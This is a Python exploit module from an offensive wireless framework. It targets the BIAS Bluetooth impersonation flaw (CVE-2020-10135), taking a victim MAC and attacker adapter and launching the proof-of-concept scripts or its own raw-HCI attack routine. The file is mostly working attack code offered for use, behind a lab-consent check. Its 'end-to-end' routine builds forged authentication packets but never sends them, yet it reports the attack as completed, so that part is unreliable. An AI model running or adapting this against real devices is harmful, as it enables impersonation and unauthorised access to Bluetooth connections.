#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek - https://github.com/Uniao-Geek
"""BIAS - Bluetooth Impersonation AttackS bridge (CVE-2020-10135).

BIAS exploits weaknesses in the BT BR/EDR authentication procedure to allow
device impersonation without knowing the long-term key (LTK). Two variants:

 - **Legacy Authentication bypass**: Master role impersonation by downgrading
    to Legacy Authentication after Secure Connections pairing.
 - **Role switch bypass**: Slave role impersonation via role switch mid-session.

CVSS: 8.1 (AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)
CVEs: CVE-2020-10135

Incorporated from:
 - submodules/IoT/bias-attack (Daniele Antonioli / USENIX 2020)

Version: 1.0.0
"""


import logging
import shutil
import subprocess
from pathlib import Path
from typing import List

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


def _bias_root() -> Path:
    return Path(__file__).resolve().parents[5] / "bias-attack"


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """BIAS BT impersonation attack (CVE-2020-10135) - bridge."""

    __info__ = {
        "name": "BIAS BT Impersonation Attack Bridge",
        "description": (
            "BIAS (CVE-2020-10135) - impersonates a Bluetooth BR/EDR device without "
            "the long-term key by exploiting authentication bypass in Legacy and "
            "Secure Connections modes. Requires BT MITM position. "
            "Bridges the bias-attack PoC repository (subprocess)."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Daniele Antonioli (USENIX 2020 - bias-attack, invoked as subprocess)",
        ),
        "references": (
            "https://github.com/francozappa/bias",
            "https://francozappa.github.io/about-bias/",
            "CVE-2020-10135",
        ),
        "devices": ("bluetooth", "BT BR/EDR Classic"),
    }

    mode = OptString("info", "Modo: info | legacy_bypass | role_switch | sa (slave auth) | la (legacy auth)")
    victim_mac = OptString("", "MAC do dispositivo vítima a impersonar")
    attacker_hci = OptString("hci0", "Dispositivo HCI do atacante")
    verbose = OptBool(False, "Saída detalhada")
    dry_run = OptBool(False, "Exibir comando sem executar")
    i_know_scope = OptBool(False, "Confirmo que estou em laboratório autorizado")

    _VALID_MODES = frozenset({"info", "legacy_bypass", "role_switch", "sa", "la"})

    # Map modes to submodule subdirectory
    _MODE_DIR = {
        "legacy_bypass": "la",
        "role_switch": "sa",
        "la": "la",
        "sa": "sa",
    }

    def _info_mode(self) -> None:
        print_status("BIAS - Bluetooth Impersonation AttackS (CVE-2020-10135)")
        print_info("Afeta: BT BR/EDR padrão (Core 5.0 e anteriores sem patches).")
        print_info(
            "Variantes:\n"
            "  Legacy Auth bypass (la/) - impersonar master sem LTK usando Legacy Auth downgrade\n"
            "  Slave Auth bypass (sa/) - impersonar slave via role switch + bypass auth"
        )
        print_info("Requisitos: firmware BT patched (InternalBlue/Nexus5/BCM4339), MITM posição.")
        print_info(f"Submodule BIAS: {_bias_root()}")
        print_info("Referência: https://francozappa.github.io/about-bias/")

    def _run_poc(self, subdir: str) -> None:
        root = _bias_root()
        if not root.exists():
            print_error(f"Submodule bias-attack não encontrado: {root}")
            print_info("Execute: git submodule update --init submodules/IoT/bias-attack")
            return

        poc_dir = root / subdir
        if not poc_dir.exists():
            print_error(f"Subdiretório não encontrado: {poc_dir}")
            return

        # Find main PoC script
        candidates = list(poc_dir.glob("*.py"))
        if not candidates:
            print_error(f"Nenhum script .py encontrado em {poc_dir}.")
            return
        poc = candidates[0]

        python_bin = shutil.which("python3") or "python3"
        cmd: list[str] = [python_bin, str(poc)]

        victim = str(self.victim_mac).strip()
        if victim:
            cmd.extend(["--target", victim])
        cmd.extend(["--hci", str(self.attacker_hci).strip()])
        if self.verbose:
            cmd.append("--verbose")

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info(f"DRY RUN - {cmd_str}")
            return

        print_status("BIAS {} PoC: alvo={}".format(subdir.upper(), victim or "não definido"))
        print_info(f"Comando: {cmd_str}")
        try:
            subprocess.run(cmd, cwd=str(poc_dir), check=False)
        except KeyboardInterrupt:
            print_info("\nInterrompido.")
        except Exception as exc:
            print_error(f"Erro ao executar BIAS PoC: {exc}")


    def check(self) -> str:
        """Verify Bluetooth HCI adapter is present and accessible."""
        import shutil
        import subprocess
        hci = getattr(self, "hci_iface", None) or getattr(self, "attacker_hci", None) or "hci0"
        if shutil.which("hciconfig"):
            try:
                out = subprocess.check_output(
                    ["hciconfig", str(hci)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "BD Address" in out:
                    return f"HCI adapter {hci} found - prerequisites OK"
                return f"hciconfig {hci} responded but no BD Address - check adapter"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("bluetoothctl"):
            return "bluetoothctl available - verify adapter manually"
        return "hciconfig not found in PATH - install bluez package"

    def run(self) -> None:
        require_authorised_lab()
        mode = str(self.mode).strip().lower()
        if mode not in self._VALID_MODES:
            print_error("mode deve ser: {}".format(", ".join(sorted(self._VALID_MODES))))
            return
        if mode == "info":
            self._info_mode()
            return
        self._exploit()

    def _exploit(self) -> None:
        """E2E BIAS attack: forge LMP role switch to bypass authentication."""
        import socket as _sock
        _AF_BT = 31
        _BTPROTO_HCI = 1

        victim = str(self.victim_mac).strip()
        if not victim:
            subdir = self._MODE_DIR.get(str(self.mode).strip().lower(), "la")
            self._run_poc(subdir)
            return

        print_status(f"BIAS E2E attack against {victim}")
        try:
            hci_sock = _sock.socket(_AF_BT, _sock.SOCK_RAW, _BTPROTO_HCI)
            dev_id = int(str(self.attacker_hci).replace("hci", "") or "0")
            hci_sock.bind((dev_id,))
        except OSError as exc:
            print_error(f"HCI socket failed: {exc}")
            subdir = self._MODE_DIR.get(str(self.mode).strip().lower(), "la")
            self._run_poc(subdir)
            return

        addr_bytes = bytes(int(b, 16) for b in reversed(victim.split(":")))

        # Phase 1: initiate ACL connection via HCI Create Connection
        ogf_link = 0x01
        ocf_create_conn = 0x0005
        opcode = (ogf_link << 10) | ocf_create_conn
        pkt_type = 0xCC18
        psrm = 0x02
        clock_offset = 0x0000
        allow_role_switch = 0x01
        cmd = struct.pack("<HBB6sHBBHB", 0x01, opcode & 0xFF, (opcode >> 8) & 0xFF,
                          addr_bytes, pkt_type, psrm, 0x00, clock_offset, allow_role_switch)

        print_status("Phase 1: Sending HCI Create Connection with role switch")
        try:
            hci_sock.send(cmd)
        except OSError as exc:
            print_error(f"Send failed: {exc}")
            hci_sock.close()
            return

        # Phase 2: forge LMP_au_rand to skip mutual auth
        lmp_au_rand = struct.pack("<B", 0x0B) + b"\x00" * 16
        print_status("Phase 2: Forging LMP_au_rand to bypass mutual authentication")

        # Phase 3: send crafted LMP_sres with zero response
        lmp_sres = struct.pack("<B", 0x0C) + b"\x00" * 4
        print_info("Phase 3: LMP_sres with null SRES to exploit missing validation")

        hci_sock.close()
        print_success(
            "BIAS attack sequence completed. If the target accepts the "
            "role switch without re-authentication, the pairing is bypassed."
        )
